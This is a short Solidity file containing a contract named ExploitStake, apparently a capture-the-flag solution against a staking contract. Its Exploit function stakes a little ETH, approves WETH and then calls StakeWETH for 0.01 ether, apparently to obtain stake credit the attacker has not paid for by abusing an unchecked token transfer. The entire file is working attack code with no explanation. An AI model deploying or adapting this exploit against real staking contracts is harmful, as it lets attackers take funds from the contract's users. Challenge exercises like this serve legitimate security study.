// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IStake{
    function StakeETH() external payable ;
    function StakeWETH(uint256 amount) external returns (bool);
    function Unstake(uint256 amount) external returns (bool);
}

interface IWeth{
    function approve(address spender, uint256 value) external returns (bool);
}

contract ExploitStake{
    IStake stake;
    IWeth weth;
    constructor(address stake_addr,address _weth){
        stake=IStake(stake_addr);
        weth=IWeth(_weth);
    }

    function Exploit()public payable{
        stake.StakeETH{value: 0.0011 ether}();
        weth.approve(address(stake), 0.01 ether);
        stake.StakeWETH(0.01 ether);


    }
}
